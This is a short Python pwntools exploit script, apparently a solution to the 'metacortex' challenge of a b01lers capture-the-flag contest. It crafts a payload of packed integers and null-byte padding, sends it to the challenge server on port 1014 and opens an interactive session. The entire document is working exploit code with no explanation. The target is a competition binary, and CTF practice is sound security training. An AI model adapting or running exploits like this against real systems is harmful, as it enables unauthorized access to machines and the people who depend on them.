from pwn import *
context.log_level='debug'
payload = p32(0x2333)+'\x00'*80+p64(0x3)

#p = process('./metacortex-72ec7dee20d0b191fe14dc2480bd3f43')
p = remote('chal.ctf.b01lers.com',1014)
#gdb.attach(p)
p.sendline(payload)

p.interactive()